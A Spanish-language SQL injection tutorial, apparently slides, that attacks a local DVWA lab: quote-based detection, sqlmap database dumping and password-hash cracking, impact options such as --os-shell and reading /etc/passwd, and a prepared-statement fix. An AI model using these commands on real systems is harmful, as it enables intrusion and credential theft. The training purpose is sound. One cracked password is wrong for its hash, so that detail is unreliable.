🔧 SQLi — Setup + Detección

Pasos 0 y 1: Levantar DVWA y detectar vulnerabilidad.

Paso 0: Setup

# Levantar DVWA
$ docker run -d -p 80:80 vulnerables/web-dvwa
# Login
$ TOKEN=$(curl -s http://localhost/login.php | grep -oP "user_token.*value='\K[^']+")
$ curl -c cookies.txt -d "username=admin&password=password&Login=Login&user_token=$TOKEN" http://localhost/login.php

Paso 1: Detección

# Request normal
$ curl -b cookies.txt "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" | grep "First name"
First name: admin
 
# Con comilla → ERROR = SQLi
$ curl -b cookies.txt "http://localhost/vulnerabilities/sqli/?id=1'&Submit=Submit"
SQL syntax error

🗺️ SQLi — Enumeración + Extracción

Pasos 2 y 3: sqlmap mapea y extrae datos.

# Obtener sesión
$ SESSID=$(grep PHPSESSID cookies.txt | awk '{print $NF}')
 
# Paso 2: Enumerar bases de datos y tablas
$ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$SESSID; security=low" --batch --dbs
available databases: [dvwa, information_schema]
$ sqlmap ... -D dvwa --tables
[2 tables] | guestbook | users |
 
# Paso 3: Extraer usuarios (LAB LOCAL)
$ sqlmap ... --batch --dump -D dvwa -T users
+----+--------+------------+----------------------------------+
| id | user | password (MD5) |
| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2 | gordon | e99a18c428cb38d5f260853678922e03 |
+----+--------+----------------------------------+

🔓 Hashes crackeados

admin → password | gordon → 123456

💥 SQLi — Impacto + Prevención

Pasos 4 y 5: Qué puede pasar y cómo defenderse.

Paso 4: Impacto Real

CVSS 9.8 CRITICAL

RCE: sqlmap --os-shell

File read: --file-read="/etc/passwd"

💰 Bounty: $2,000 - $50,000

Paso 5: Prevención

# ❌ VULNERABLE
$query = "SELECT * FROM users WHERE id='$id'";
 
# ✅ SEGURO (Prepared Statement)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
